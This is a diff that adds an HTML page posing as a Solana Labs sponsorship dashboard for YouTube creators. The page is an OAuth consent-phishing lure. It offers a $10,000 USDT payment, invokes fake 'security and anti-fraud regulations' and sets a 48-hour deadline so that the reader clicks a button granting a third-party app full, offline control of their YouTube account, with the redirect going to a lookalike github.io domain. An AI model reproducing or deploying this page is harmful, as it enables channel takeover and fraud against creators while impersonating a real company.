@@ -1,1 +1,120 @@
+Put ouauth here as an example <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Solana Sponsorship Dashboard</title>
+<style>
+  body {
+    margin: 0;
+    background-color: #000000;
+    color: #ffffff;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    padding: 20px;
+  }
+  .container {
+    max-width: 700px;
+    margin: 40px auto;
+    background-color: #000000;
+    border-radius: 10px;
+    padding: 30px;
+    box-shadow: 0 0 15px rgba(0, 255, 163, 0.3);
+  }
+  img {
+    display: block;
+    margin: 0 auto 25px;
+    width: 120px;
+  }
+  h1 {
+    color: #00FFA3;
+    text-align: center;
+    margin-bottom: 10px;
+  }
+  p.lead {
+    font-size: 18px;
+    line-height: 1.5;
+    text-align: center;
+    margin-bottom: 40px;
+  }
+  .section {
+    margin-bottom: 35px;
+  }
+  h2 {
+    color: #00FFA3;
+    border-bottom: 2px solid #00FFA3;
+    padding-bottom: 6px;
+    margin-bottom: 15px;
+  }
+  .oauth-btn {
+    background-color: #00FFA3;
+    color: #000000;
+    font-weight: 700;
+    padding: 14px 40px;
+    border-radius: 30px;
+    display: inline-block;
+    box-shadow: 0 4px 8px rgba(0, 255, 163, 0.3);
+    cursor: pointer;
+    border: none;
+    font-size: 16px;
+    transition: background-color 0.3s ease;
+    text-align: center;
+    text-decoration: none;
+    margin: 0 auto;
+    display: block;
+    max-width: 250px;
+  }
+  .oauth-btn:hover {
+    background-color: #00cc82;
+  }
+  footer {
+    margin-top: 50px;
+    font-size: 13px;
+    color: #666;
+    text-align: center;
+  }
+  footer a {
+    color: #00FFA3;
+    text-decoration: none;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToIG8feZdv7SVG0RYdGFUy8FDf_wxddAruJQ&s" alt="Solana Logo" />
+    <h1>Solana Sponsorship Dashboard</h1>
+    <p class="lead">Welcome! This dashboard contains your sponsorship proposal details and next steps.</p>
 
+    <div class="section">
+      <h2>Campaign Overview</h2>
+      <ul>
+        <li>Sponsored Integration: 30-60 seconds in one upcoming video</li>
+        <li>Upfront Payment: <strong>$10,000 USDT</strong></li>
+        <li>Contract Duration: 30 days</li>
+        <li>Campaign Start Date: <em>[Date]</em></li>
+      </ul>
+    </div>
+
+    <div class="section">
+      <h2>Verification Policy for Sponsorship Payments</h2>
+      <p>To comply with Solana Labs’ security and anti-fraud regulations, you must verify ownership of your YouTube channel and provide your associated payment info before any sponsorship payments can be processed.</p>
+      <p>Please connect your YouTube account below within 48 hours to avoid payment delays or cancellation.</p>
+
+      <a class="oauth-btn" href="https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent
+">Connect with YouTube</a>
+    </div>
+
+    <div class="section">
+      <h2>Contact</h2>
+      <p>If you have any questions, contact Marcus V., Partnerships Manager:</p>
+      <ul>
+        <li>Email: <a href="mailto:solana.marketing.team@gmail.com">solana.marketing.team@gmail.com</a></li>
+        <li>Phone: +1 (555) 123-4567</li>
+      </ul>
+    </div>
+
+    <footer>
+      &copy; 2025 Solana Labs | <a href="https://www.solana.com" target="_blank" rel="noopener noreferrer">www.solana.com</a>
+    </footer>
+  </div>
+</body>
+</html>
